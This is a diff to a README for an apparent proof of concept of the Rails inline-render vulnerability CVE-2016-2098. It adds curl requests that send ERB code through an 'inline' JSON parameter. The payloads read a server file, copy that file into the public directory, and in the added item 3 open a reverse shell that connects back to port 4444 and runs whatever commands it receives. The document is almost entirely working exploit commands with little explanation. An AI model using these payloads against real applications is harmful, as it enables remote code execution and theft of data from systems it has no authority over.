@@ -14,5 +14,9 @@ Proof of concept for  https://groups.google.com/forum/#!topic/rubyonrails-securi
 `curl -v -H "Accept: application/json" -H "Content-type: application/json" -X GET -d ' {"id" : { "inline" : "<%= File.read \"dama_ouro.jpg\"%>"}}'  http://localhost:3000/exploits`
 2. https://www.exploit-db.com/exploits/40086/
 
+3. curl -H "Content-type: application/json" -X GET -d ' {"id" : {"inline" : "<%= require \"socket\";exit if fork;c=TCPSocket.new(\"localhost\",\"4444\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end %>"}}' http://localhost:3000/exploits
+
+4. curl -v -H "Accept: application/json" -H "Content-type: application/json" -X GET -d ' {"id" : { "inline" : "<%= FileUtils.cp \"dama_ouro.jpg\", \"public/dama_ouro.jpg\"%>"}}'  http://localhost:3000/exploits
+
 == Other:
 https://www.cvedetails.com/cve/CVE-2016-2098/
